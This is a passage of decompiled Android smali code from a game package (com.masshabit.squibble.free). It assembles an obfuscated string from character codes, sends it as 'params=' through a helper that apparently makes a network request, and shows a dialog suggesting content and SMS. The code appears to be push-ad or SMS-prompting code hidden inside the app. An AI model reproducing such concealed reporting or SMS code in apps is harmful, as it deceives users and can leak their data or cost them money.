    invoke-static {v3}, Lcom/masshabit/squibble/free/activity/e/p;->a(I)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-static {}, Lcom/masshabit/squibble/free/activity/e/k;->b()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const/16 v3, 0x2e

    invoke-static {v3}, Lcom/masshabit/squibble/free/activity/e/p;->a(I)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-static {}, Lcom/masshabit/squibble/free/activity/e/k;->c()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const/16 v3, 0x2f

    invoke-static {v3}, Lcom/masshabit/squibble/free/activity/e/p;->a(I)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-static {}, Lcom/masshabit/squibble/free/activity/e/k;->d()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const/16 v3, 0x43

    invoke-static {v3}, Lcom/masshabit/squibble/free/activity/e/p;->a(I)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-static {}, Lcom/masshabit/squibble/free/activity/e/k;->e()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const/16 v3, 0x44

    invoke-static {v3}, Lcom/masshabit/squibble/free/activity/e/p;->a(I)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-static {}, Lcom/masshabit/squibble/free/activity/e/k;->f()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const/16 v3, 0x45

    invoke-static {v3}, Lcom/masshabit/squibble/free/activity/e/p;->a(I)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-static {}, Lcom/masshabit/squibble/free/activity/e/k;->g()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const/16 v3, 0x30

    invoke-static {v3}, Lcom/masshabit/squibble/free/activity/e/p;->a(I)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v1}, Lcom/masshabit/squibble/free/activity/Pushable;->h()I

    move-result v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1}, Lcom/masshabit/squibble/free/activity/Pushable;->g()Ljava/lang/String;

    move-result-object v1

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "params="

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-static {v2}, Lcom/masshabit/squibble/free/activity/e/q;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, Lcom/masshabit/squibble/free/activity/e/n;->a(Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_1

    :catch_0
    move-exception v1

    goto/16 :goto_1

    :cond_4
    invoke-virtual {v2}, Lcom/masshabit/squibble/free/activity/c;->d()Lcom/masshabit/squibble/free/activity/a/Abstract;

    move-result-object v3

    instance-of v3, v3, Lcom/masshabit/squibble/free/activity/a/q;

    if-eqz v3, :cond_3

    invoke-virtual {v2}, Lcom/masshabit/squibble/free/activity/c;->d()Lcom/masshabit/squibble/free/activity/a/Abstract;

    move-result-object v3

    const-string v4, "ACTIVITY_PARAM_SUGGEST_CONTENT_KEY"

    invoke-virtual {v3, v4}, Lcom/masshabit/squibble/free/activity/a/Abstract;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    iput-object v3, p0, Lcom/masshabit/squibble/free/activity/h;->k:Ljava/lang/String;

    invoke-virtual {v2}, Lcom/masshabit/squibble/free/activity/c;->d()Lcom/masshabit/squibble/free/activity/a/Abstract;

    move-result-object v2

    const-string v3, "ACTIVITY_PARAM_SUGGEST_SMS_KEY"

    invoke-virtual {v2, v3}, Lcom/masshabit/squibble/free/activity/a/Abstract;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    iput-object v2, p0, Lcom/masshabit/squibble/free/activity/h;->l:Ljava/lang/String;

    const/4 v2, 0x1

    invoke-virtual {p0, v2}, Lcom/masshabit/squibble/free/activity/h;->onCreateDialog(I)Landroid/app/Dialog;

    move-result-object v2

    invoke-virtual {v2}, Landroid/app/Dialog;->show()V

    goto/16 :goto_2

    :cond_5
    invoke-virtual {p0}, Lcom/masshabit/squibble/free/activity/h;->finish()V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    goto/16 :goto_2

    :catch_1
    move-exception v2

    goto/16 :goto_0
.end method

.method public onCreateDialog(I)Landroid/app/Dialog;
    .locals 3

    const/4 v0, 0x1

    if-ne p1, v0, :cond_0

    new-instance v0, Landroid/app/AlertDialog$Builder;

    invoke-direct {v0, p0}, Landroid/app/AlertDialog$Builder;-><init>(Landroid/content/Context;)V

    iget-object v1, p0, Lcom/masshabit/squibble/free/activity/h;->k:Ljava/lang/String;

    invoke-virtual {v0, v1}, Landroid/app/AlertDialog$Builder;->setTitle(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    move-result-object v0

    const-string v1, "\u597d"

    new-instance v2, Lcom/masshabit/squibble/free/activity/t;

    invoke-direct {v2, p0}, Lcom/masshabit/squibble/free/activity/t;-><init>(Lcom/masshabit/squibble/free/activity/h;)V

    invoke-virtual {v0, v1, v2}, Landroid/app/AlertDialog$Builder;->setPositiveButton(Ljava/lang/CharSequence;Landroid/content/DialogInterface$OnClickListener;)Landroid/app/AlertDialog$Builder;

    move-result-object v0

    const-string v1, "\u4e0d"

    new-instance v2, Lcom/masshabit/squibble/free/activity/s;

    invoke-direct {v2, p0}, Lcom/masshabit/squibble/free/activity/s;-><init>(Lcom/masshabit/squibble/free/activity/h;)V

    invoke-virtual {v0, v1, v2}, Landroid/app/AlertDialog$Builder;->setNegativeButton(Ljava/lang/CharSequence;Landroid/content/DialogInterface$OnClickListener;)Landroid/app/AlertDialog$Builder;

    move-result-object v0

    new-instance v1, Lcom/masshabit/squibble/free/activity/r;

    invoke-direct {v1, p0}, Lcom/masshabit/squibble/free/activity/r;-><init>(Lcom/masshabit/squibble/free/activity/h;)V

    invoke-virtual {v0, v1}, Landroid/app/AlertDialog$Builder;->setOnCancelListener(Landroid/content/DialogInterface$OnCancelListener;)Landroid/app/AlertDialog$Builder;

    move-result-object v0

    invoke-virtual {v0}, Landroid/app/AlertDialog$Builder;->create()Landroid/app/AlertDialog;

    move-result-object v0

    :goto_0
    return-object v0

    :cond_0
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreateDialog(I)Landroid/app/Dialog;

    move-result-object v0

    goto :goto_0
.end method
